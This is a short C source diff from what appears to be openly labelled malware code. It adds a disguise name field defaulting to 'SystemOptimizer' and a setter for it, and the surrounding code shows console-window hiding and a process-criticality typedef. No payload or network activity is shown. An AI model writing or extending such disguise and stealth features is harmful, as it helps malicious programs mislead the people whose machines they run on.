@@ -63,6 +63,7 @@ typedef long (WINAPI* RtlSetProcessIsCritical)(
 
 struct c_malware_stat__t{
 	char	name[PAMAX];
+	char	fakename[155];
 
 	size_t  size;
 };
@@ -85,6 +86,8 @@ void cvinit(int argc, char** argv){
 	Current.size=GetFileSize(fh, NULL);
 
 	strncpy(Current.name, argv[0], PAMAX);
+	strncpy(Current.fakename, "SystemOptimizer", 155);
+
 
 	CloseHandle(fh);
 
@@ -101,6 +104,10 @@ void SetMalwareMode(int mode){
 		wh=FindWindow("ConsoleWindowClass", NULL);
 		ShowWindow(wh, 0x00);
 	}
+}
+
+void SetMalwareFakeName(const char* name){
+	strncpy(Current.fakename, name, 155);
 }
 
 void cvexit(int x){
